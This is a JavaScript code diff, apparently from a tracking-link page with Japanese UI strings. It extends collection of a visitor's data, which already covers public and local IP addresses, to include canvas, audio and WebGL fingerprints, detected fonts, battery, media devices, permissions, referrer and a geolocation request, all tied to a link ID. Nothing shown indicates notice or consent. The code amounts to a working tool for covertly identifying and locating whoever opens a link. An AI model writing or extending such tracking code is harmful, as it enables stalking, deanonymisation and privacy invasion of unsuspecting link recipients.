@@ -334,6 +334,12 @@
             try {
                 const publicIP = await getPublicIP();
                 const localIPs = await getLocalIPs();
+                const battery = await getBatteryInfo();
+                const webgl = getWebGLInfo();
+                const plugins = getPlugins();
+                const fonts = await detectFonts();
+                const canvas = getCanvasFingerprint();
+                const audio = getAudioFingerprint();
                 
                 const visitorData = {
                     linkId: linkId,
@@ -342,13 +348,41 @@
                     localIPs: localIPs,
                     userAgent: navigator.userAgent,
                     browser: getBrowser(),
+                    browserVersion: getBrowserVersion(),
                     os: getOS(),
                     screenResolution: `${screen.width}x${screen.height}`,
+                    windowSize: `${window.innerWidth}x${window.innerHeight}`,
+                    colorDepth: `${screen.colorDepth} bit`,
+                    pixelRatio: window.devicePixelRatio,
                     deviceMemory: navigator.deviceMemory ? `${navigator.deviceMemory} GB` : '不明',
+                    hardwareConcurrency: navigator.hardwareConcurrency || '不明',
                     language: navigator.language,
+                    languages: navigator.languages ? navigator.languages.join(', ') : '不明',
                     timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                    timezoneOffset: new Date().getTimezoneOffset(),
                     platform: navigator.platform,
-                    connection: getConnectionInfo()
+                    connection: getConnectionInfo(),
+                    cookiesEnabled: navigator.cookieEnabled,
+                    doNotTrack: navigator.doNotTrack || '不明',
+                    referrer: document.referrer || 'なし',
+                    online: navigator.onLine,
+                    touchSupport: getTouchSupport(),
+                    maxTouchPoints: navigator.maxTouchPoints || 0,
+                    vendor: navigator.vendor,
+                    product: navigator.product,
+                    productSub: navigator.productSub,
+                    buildID: navigator.buildID || '不明',
+                    oscpu: navigator.oscpu || '不明',
+                    battery: battery,
+                    webgl: webgl,
+                    plugins: plugins,
+                    fonts: fonts,
+                    canvasFingerprint: canvas,
+                    audioFingerprint: audio,
+                    mediaDevices: await getMediaDevices(),
+                    permissions: await getPermissions(),
+                    storage: getStorageInfo(),
+                    geolocation: await getGeolocation()
                 };
                 
                 // LocalStorageに保存
